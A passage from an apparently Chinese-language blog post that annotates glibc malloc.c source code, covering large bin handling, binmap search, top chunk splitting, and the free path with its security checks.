&amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                 <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &lt; (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (bck-&gt;bk-&gt;size))<span class="hljs-comment">//比最小的还小</span><br>                   &#123;<br>                     fwd = bck;<span class="hljs-comment">//第一个小链表</span><br>                     bck = bck-&gt;bk;<span class="hljs-comment">//最后一个小链表</span><br><br>                     victim-&gt;fd_nextsize = fwd-&gt;fd;<span class="hljs-comment">//连接最大chunk链                    </span><br>victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;<span class="hljs-comment">//连接原最小chunk链</span><br>                     fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//前后相连</span><br>                   &#125;<br>                 <span class="hljs-keyword">else</span><br>                   &#123;<br>                     assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                     <span class="hljs-keyword">while</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size &lt; fwd-&gt;size)<br>                       &#123;<br>                         fwd = fwd-&gt;fd_nextsize;<br>                         assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="hljs-number">0</span>);<br>                       &#125;<span class="hljs-comment">//找到第一个比victim小的</span><br><br>                     <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                       <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                       fwd = fwd-&gt;fd;<br>                     <span class="hljs-keyword">else</span><br>                       &#123;<br>                         victim-&gt;fd_nextsize = fwd;<br>                         victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<br>                         fwd-&gt;bk_nextsize = victim;<br>                         victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<br><span class="hljs-comment">//接入nextsize链</span><br>                       &#125;<br>                     bck = fwd-&gt;bk;<br>                   &#125;<br>               &#125;<br>             <span class="hljs-keyword">else</span><span class="hljs-comment">//如果链空</span><br>               victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>           &#125;<br><span class="hljs-comment">//接入bin链</span><br>         mark_bin (av, victim_index);<span class="hljs-comment">//标识binmap</span><br>         victim-&gt;bk = bck;<br>         victim-&gt;fd = fwd;<br>         fwd-&gt;bk = victim;<br>         bck-&gt;fd = victim;<br></code></pre></td></tr></table></figure></li></ul><h4 id="在large-bin中查找"><a href="#在large-bin中查找" class="headerlink" title="在large bin中查找"></a>在large bin中查找</h4><p>（9）在large bin中找</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//如果nb在large bin范围内</span><br>     <span class="hljs-keyword">if</span> (!in_smallbin_range (nb))<br>       &#123;<br>         bin = bin_at (av, idx);<br><br>         <span class="hljs-comment">/* skip scan if empty or largest chunk is too small */</span><br><span class="hljs-comment">//如果bin中非空且最大chunk的size&gt;nb，</span><br>         <span class="hljs-keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;<br>             (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (victim-&gt;size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb))<br>           &#123;<br>             victim = victim-&gt;bk_nextsize;<br><span class="hljs-comment">//定位至最小的chunk链</span><br>             <span class="hljs-keyword">while</span> (((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size = chunksize (victim)) &lt;<br>                     (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb)))<br>               victim = victim-&gt;bk_nextsize;<br><br>             <span class="hljs-comment">/* Avoid removing the first entry for a size so that the skip</span><br><span class="hljs-comment">                list does not have to be rerouted.  */</span><br>             <span class="hljs-keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)<br>               victim = victim-&gt;fd;<br><span class="hljs-comment">//避免移走有很多个chunk的小chunk链的头结点</span><br><br>             remainder_size = size - nb;<br>             unlink (av, victim, bck, fwd);<br><span class="hljs-comment">//摘除</span><br><br>             <span class="hljs-comment">/* Exhaust */</span><br><span class="hljs-comment">//不能切分则全部返回</span><br>             <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>               &#123;<br>                 set_inuse_bit_at_offset (victim, size);<br>                 <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                   victim-&gt;size |= NON_MAIN_ARENA;<br>               &#125;<br>             <span class="hljs-comment">/* Split */</span><br>             <span class="hljs-keyword">else</span><br><span class="hljs-comment">//能切分则切分后返回，并将remainder插入unsorted bin</span><br>               &#123;<br>                 remainder = chunk_at_offset (victim, nb);<br>                 <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                    have to perform a complete insert here.  */</span><br>                 bck = unsorted_chunks (av);<br>                 fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                   &#123;<br>                     errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;<br>                     <span class="hljs-keyword">goto</span> errout;<br>                   &#125;<br>                 remainder-&gt;bk = bck;<br>                 remainder-&gt;fd = fwd;<br>                 bck-&gt;fd = remainder;<br>                 fwd-&gt;bk = remainder;<br><span class="hljs-comment">//如果remainder大小属于fast bin则nextsize指针置零</span><br>                 <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                   &#123;<br>                     remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                     remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                   &#125;<br>                 set_head (victim, nb | PREV_INUSE |<br>                           (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                 set_head (remainder, remainder_size | PREV_INUSE);<br>                 set_foot (remainder, remainder_size);<br>               &#125;<br>             check_malloced_chunk (av, victim, nb);<br>             <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>             alloc_perturb (p, bytes);<br>             <span class="hljs-keyword">return</span> p;<br>           &#125;<br>       &#125;<br></code></pre></td></tr></table></figure><h4 id="binmap搜索bin"><a href="#binmap搜索bin" class="headerlink" title="binmap搜索bin"></a>binmap搜索bin</h4><p>（10）进入内层第二个for(;;)循环，根据binmap搜索bins</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//定位binmap数组</span><br>      ++idx;<br>      bin = bin_at (av, idx);<br>      block = idx2block (idx);<br>      <span class="hljs-built_in">map</span> = av-&gt;binmap[block];<br>      bit = idx2bit (idx);<br><br>      <span class="hljs-keyword">for</span> (;; )<br>        &#123;<br>          <span class="hljs-comment">/* Skip rest of block if there are no more set bits in this block.  */</span><br>          <span class="hljs-keyword">if</span> (bit &gt; <span class="hljs-built_in">map</span> || bit == <span class="hljs-number">0</span>)<br>            &#123;<br>              <span class="hljs-keyword">do</span><span class="hljs-comment">//找比要求大小大的第一个bin_block</span><br>                &#123;<br>                  <span class="hljs-keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="hljs-comment">/* out of bins */</span><br>                    <span class="hljs-keyword">goto</span> use_top;<span class="hljs-comment">//如果bins全空，切割top chunk</span><br>                &#125;<br>              <span class="hljs-keyword">while</span> ((<span class="hljs-built_in">map</span> = av-&gt;binmap[block]) == <span class="hljs-number">0</span>);<br><br>              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));<br>              bit = <span class="hljs-number">1</span>;<br>            &#125;<br><br>          <span class="hljs-comment">/* Advance to bin with set bit. There must be one. */</span><br>          <span class="hljs-keyword">while</span> ((bit &amp; <span class="hljs-built_in">map</span>) == <span class="hljs-number">0</span>)<span class="hljs-comment">//定位bin</span><br>            &#123;<br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>              assert (bit != <span class="hljs-number">0</span>);<br>            &#125;<br><br>          <span class="hljs-comment">/* Inspect the bin. It is likely to be non-empty */</span><br>          victim = last (bin);<br><br>          <span class="hljs-comment">/*  If a false alarm (empty bin), clear the bit. */</span><br>          <span class="hljs-keyword">if</span> (victim == bin)<br>            &#123;<br>              av-&gt;binmap[block] = <span class="hljs-built_in">map</span> &amp;= ~bit; <span class="hljs-comment">/* Write through */</span><br>              bin = next_bin (bin);<br>              bit &lt;&lt;= <span class="hljs-number">1</span>;<br>            &#125;<br><br>          <span class="hljs-keyword">else</span><span class="hljs-comment">//切割并将remainder插入unsorted bin，同上</span><br>            &#123;<br>              size = chunksize (victim);<br><br>              <span class="hljs-comment">/*  We know the first chunk in this bin is big enough to use. */</span><br>              assert ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb));<br><br>              remainder_size = size - nb;<br><br>              <span class="hljs-comment">/* unlink */</span><br>              unlink (av, victim, bck, fwd);<br><br>              <span class="hljs-comment">/* Exhaust */</span><br>              <span class="hljs-keyword">if</span> (remainder_size &lt; MINSIZE)<br>                &#123;<br>                  set_inuse_bit_at_offset (victim, size);<br>                  <span class="hljs-keyword">if</span> (av != &amp;main_arena)<br>                    victim-&gt;size |= NON_MAIN_ARENA;<br>                &#125;<br><br>              <span class="hljs-comment">/* Split */</span><br>              <span class="hljs-keyword">else</span><br>                &#123;<br>                  remainder = chunk_at_offset (victim, nb);<br><br>                  <span class="hljs-comment">/* We cannot assume the unsorted list is empty and therefore</span><br><span class="hljs-comment">                     have to perform a complete insert here.  */</span><br>                  bck = unsorted_chunks (av);<br>                  fwd = bck-&gt;fd;<br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))<br>                    &#123;<br>                      errstr = <span class="hljs-string">&quot;malloc(): corrupted unsorted chunks 2&quot;</span>;<br>                      <span class="hljs-keyword">goto</span> errout;<br>                    &#125;<br>                  remainder-&gt;bk = bck;<br>                  remainder-&gt;fd = fwd;<br>                  bck-&gt;fd = remainder;<br>                  fwd-&gt;bk = remainder;<br><br>                  <span class="hljs-comment">/* advertise as last remainder */</span><br>                  <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<br>                    av-&gt;last_remainder = remainder;<br>                  <span class="hljs-keyword">if</span> (!in_smallbin_range (remainder_size))<br>                    &#123;<br>                      remainder-&gt;fd_nextsize = <span class="hljs-literal">NULL</span>;<br>                      remainder-&gt;bk_nextsize = <span class="hljs-literal">NULL</span>;<br>                    &#125;<br>                  set_head (victim, nb | PREV_INUSE |<br>                            (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>                  set_head (remainder, remainder_size | PREV_INUSE);<br>                  set_foot (remainder, remainder_size);<br>                &#125;<br>              check_malloced_chunk (av, victim, nb);<br>              <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>              alloc_perturb (p, bytes);<br>              <span class="hljs-keyword">return</span> p;<br>            &#125;<br>        &#125;<br></code></pre></td></tr></table></figure><h4 id="切割top-chunk"><a href="#切割top-chunk" class="headerlink" title="切割top chunk"></a>切割top chunk</h4><p>（11）切割top chunk</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs c">   use_top:<br><br>     victim = av-&gt;top;<br>     size = chunksize (victim);<br><br><span class="hljs-comment">//top chunk可切割就切割并返回</span><br>     <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (size) &gt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) (nb + MINSIZE))<br>       &#123;<br>         remainder_size = size - nb;<br>         remainder = chunk_at_offset (victim, nb);<br>         av-&gt;top = remainder;<br>         set_head (victim, nb | PREV_INUSE |<br>                   (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="hljs-number">0</span>));<br>         set_head (remainder, remainder_size | PREV_INUSE);<br><br>         check_malloced_chunk (av, victim, nb);<br>         <span class="hljs-type">void</span> *p = chunk2mem (victim);<br>         alloc_perturb (p, bytes);<br>         <span class="hljs-keyword">return</span> p;<br>       &#125;<br><br>     <span class="hljs-comment">/* When we are using atomic ops to free fast chunks we can get</span><br><span class="hljs-comment">        here for all block sizes.  */</span><br>     <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (have_fastchunks (av))<br>       &#123;<br>         malloc_consolidate (av);<span class="hljs-comment">//如果fastbin非空，整理</span><br>         <span class="hljs-comment">/* restore original bin index */</span><br>         <span class="hljs-keyword">if</span> (in_smallbin_range (nb))<span class="hljs-comment">//确定index，外部循环再次尝试</span><br>           idx = smallbin_index (nb);<br>         <span class="hljs-keyword">else</span><br>           idx = largebin_index (nb);<br>       &#125;<br><br>     <span class="hljs-comment">/*</span><br><span class="hljs-comment">        Otherwise, relay to handle system-dependent cases</span><br><span class="hljs-comment">      */</span><br>     <span class="hljs-keyword">else</span><span class="hljs-comment">//否则sysmalloc分配</span><br>       &#123;<br>         <span class="hljs-type">void</span> *p = sysmalloc (nb, av);<br>         <span class="hljs-keyword">if</span> (p != <span class="hljs-literal">NULL</span>)<br>           alloc_perturb (p, bytes);<br>         <span class="hljs-keyword">return</span> p;<br>       &#125;<br></code></pre></td></tr></table></figure><h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><h3 id="libc-free"><a href="#libc-free" class="headerlink" title="__libc_free"></a>__libc_free</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span><br>__libc_free (<span class="hljs-type">void</span> *mem)<br>&#123;<br>  mstate ar_ptr;<br>  mchunkptr p;                          <span class="hljs-comment">/* chunk corresponding to mem */</span><br><br>  <span class="hljs-type">void</span> (*hook) (<span class="hljs-type">void</span> *, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *)<br>    = atomic_forced_read (__free_hook);<br>  <span class="hljs-keyword">if</span> (__builtin_expect (hook != <span class="hljs-literal">NULL</span>, <span class="hljs-number">0</span>))<br>    &#123;<br>      (*hook)(mem, RETURN_ADDRESS (<span class="hljs-number">0</span>));<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-comment">//读取free_hook</span><br><br>  <span class="hljs-keyword">if</span> (mem == <span class="hljs-number">0</span>)                              <span class="hljs-comment">/* free(0) has no effect */</span><br>    <span class="hljs-keyword">return</span>;<br><br>  p = mem2chunk (mem);<br><br>  <span class="hljs-keyword">if</span> (chunk_is_mmapped (p))                       <span class="hljs-comment">/* release mmapped memory. */</span><br>    &#123;<br>      <span class="hljs-comment">/* see if the dynamic brk/mmap threshold needs adjusting */</span><br>      <span class="hljs-keyword">if</span> (!mp_.no_dyn_threshold<br>          &amp;&amp; p-&gt;size &gt; mp_.mmap_threshold<br>          &amp;&amp; p-&gt;size &lt;= DEFAULT_MMAP_THRESHOLD_MAX)<br>        &#123;<br>          mp_.mmap_threshold = chunksize (p);<br>          mp_.trim_threshold = <span class="hljs-number">2</span> * mp_.mmap_threshold;<br>          LIBC_PROBE (memory_mallopt_free_dyn_thresholds, <span class="hljs-number">2</span>,<br>                      mp_.mmap_threshold, mp_.trim_threshold);<br>        &#125;<br>      munmap_chunk (p);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><br>  ar_ptr = arena_for_chunk (p);<br>  _int_free (ar_ptr, p, <span class="hljs-number">0</span>);<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="int-free"><a href="#int-free" class="headerlink" title="_int_free"></a>_int_free</h3><h4 id="一些安全检查"><a href="#一些安全检查" class="headerlink" title="一些安全检查"></a>一些安全检查</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c">size = chunksize (p);<br><span class="hljs-comment">//筛掉一些特别大的chunk（超出内存边界）</span><br>  <span class="hljs-keyword">if</span> (__builtin_expect ((<span class="hljs-type">uintptr_t</span>) p &gt; (<span class="hljs-type">uintptr_t</span>) -size, <span class="hljs-number">0</span>)<br>      || __builtin_expect (misaligned_chunk (p), <span class="hljs-number">0</span>))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid pointer&quot;</span>;<br>    errout:<br>      <span class="hljs-keyword">if</span> (!have_lock &amp;&amp; locked)<br>        (<span class="hljs-type">void</span>) mutex_unlock (&amp;av-&gt;mutex);<br>      malloc_printerr (check_action, errstr, chunk2mem (p), av);<br>      <span class="hljs-keyword">return</span>;<br>    &#125;<br><span class="hljs-comment">//对齐检查</span><br>  <span class="hljs-keyword">if</span> (__glibc_unlikely (size &lt; MINSIZE || !aligned_OK (size)))<br>    &#123;<br>      errstr = <span class="hljs-string">&quot;free(): invalid size&quot;</span>;<br>      <span class="hljs-keyword">goto</span> errout;<br>    &#125;<br><br><span class="hljs-comment">//仅当定义了MALLOC_DEBUG时使用</span><br>  check_inuse_chunk(av, p);<br></code></pre></td></tr></table></figure><h4 id="chunk在fastbin范围内且下一个chunk不是top-chunk"><a href="#chunk在fastbin范围内且下一个chunk不是top-chunk" class="headerlink" title="chunk在fastbin范围内且下一个chunk不是top chunk"></a>chunk在fastbin范围内且下一个chunk不是top chunk</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><code class="hljs c">  <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(size) &lt;= (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(get_max_fast ())<br><br><span class="hljs-meta">#<span class="hljs-keyword">if</span> TRIM_FASTBINS</span><br>      <span class="hljs-comment">/*</span><br><span class="hljs-comment">If TRIM_FASTBINS set, don&#x27;t place chunks</span><br><span class="hljs-comment">bordering top into fastbins</span><br><span class="hljs-comment">      */</span><br>      &amp;&amp; (chunk_at_offset(p, size) != av-&gt;top)<br><span class="hljs-meta">#<span class="hljs-keyword">endif</span></span><br>      ) &#123;<br><br><span class="hljs-comment">//下一个chunk的size合法</span><br>    <span class="hljs-keyword">if</span> (__builtin_expect (chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ, <span class="hljs-number">0</span>)<br>|| __builtin_expect (chunksize (chunk_at_offset (p, size))<br>     &gt;= av-&gt;system_mem, <span class="hljs-number">0</span>))<br>      &#123;<br><span class="hljs-comment">/* We might not have a lock at this point and concurrent modifications</span><br><span class="hljs-comment">   of system_mem might have let to a false positive.  Redo the test</span><br><span class="hljs-comment">   after getting the lock.  */</span><br><span class="hljs-keyword">if</span> (have_lock<br>    || (&#123; assert (locked == <span class="hljs-number">0</span>);<br>  mutex_lock(&amp;av-&gt;mutex);<br>  locked = <span class="hljs-number">1</span>;<br>  chunk_at_offset (p, size)-&gt;size &lt;= <span class="hljs-number">2</span> * SIZE_SZ<br>    || chunksize (chunk_at_offset (p, size)) &gt;= av-&gt;system_mem;<br>      &#125;))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;free(): invalid next size (fast)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><span class="hljs-keyword">if</span> (! have_lock)<br>  &#123;<br>    (<span class="hljs-type">void</span>)mutex_unlock(&amp;av-&gt;mutex);<br>    locked = <span class="hljs-number">0</span>;<br>  &#125;<br>      &#125;<br><br><span class="hljs-comment">//释放前user data填充为perturb_byte（0）</span><br>    free_perturb (chunk2mem(p), size - <span class="hljs-number">2</span> * SIZE_SZ);<br><br>    set_fastchunks(av);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> idx = fastbin_index(size);<br>    fb = &amp;fastbin (av, idx);<br><br><span class="hljs-comment">//原子操作将chunk插入fast bin</span><br>    mchunkptr old = *fb, old2;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> old_idx = ~<span class="hljs-number">0u</span>;<br>    <span class="hljs-keyword">do</span><br>      &#123;<br><span class="hljs-comment">//检查fastbin的第一个chunk是不是插入的chunk（double free检查）</span><br><span class="hljs-keyword">if</span> (__builtin_expect (old == p, <span class="hljs-number">0</span>))<br>  &#123;<br>    errstr = <span class="hljs-string">&quot;double free or corruption (fasttop)&quot;</span>;<br>    <span class="hljs-keyword">goto</span> errout;<br>  &#125;<br><br><span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span>)<br>  old_idx = fastbin_index(chunksize(old));<br>p-&gt;fd = old2 = old;<br>      &#125;<br>    <span class="hljs-keyword">while</span> ((old = catomic_compare_and_exchange_val_rel (fb, p, old2)) != old2);<br><br>    <span class="hljs-keyword">if</span> (have_lock &amp;&amp; old != <span class="hljs-literal">NULL</span> &amp;&amp; __builtin_expect (old_idx != idx, <span class="hljs-number">0</span>))<br>      &#123;<br>errstr = <span class="hljs-string">&quot;invalid fastbin entry (free)&quot;</span>;<br><span class="hljs-keyword">goto</span> errout;<br>      &#125;<br>  &#125;<br></code></pre></td></tr></table></figure><h4 id="非mmap的chunk，先是一些安全检查"><a href="#非mmap的chunk，先是一些安全检查" class="headerlink" title="非mmap的chunk，先是一些安全检查"></a>非mmap的chunk，先是一些安全检查</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span 